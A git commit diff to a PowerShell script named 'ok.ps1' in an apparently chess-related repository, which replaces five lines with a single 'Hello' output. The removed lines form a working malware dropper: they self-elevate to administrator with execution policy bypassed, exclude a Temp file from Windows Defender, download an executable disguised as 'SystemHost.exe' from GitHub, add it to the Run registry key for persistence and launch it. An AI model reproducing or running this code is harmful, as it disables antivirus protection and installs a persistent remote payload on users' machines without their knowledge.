ec551171a1690525fd493244ffff3d791e8e547b
Thịnh <130970460+Rdthaiphno064@users.noreply.github.com>
2024-12-30 13:06:12 +0700

    Update ok.ps1

--- chess/image/ok.ps1
+++ chess/image/ok.ps1
@@ -1,5 +1,1 @@
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File', $MyInvocation.MyCommand.Definition -Verb RunAs; exit }
-Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"
-Invoke-WebRequest -Uri 'https://github.com/Rdthaiphno064/tthinh/raw/refs/heads/main/SystemHost.exe' -OutFile "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"
-New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemHost' -Value "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe" -Force
-Start-Process "C:\Users\$env:USERNAME\AppData\Local\Temp\SystemHost.exe"
+Write-Output "Hello"
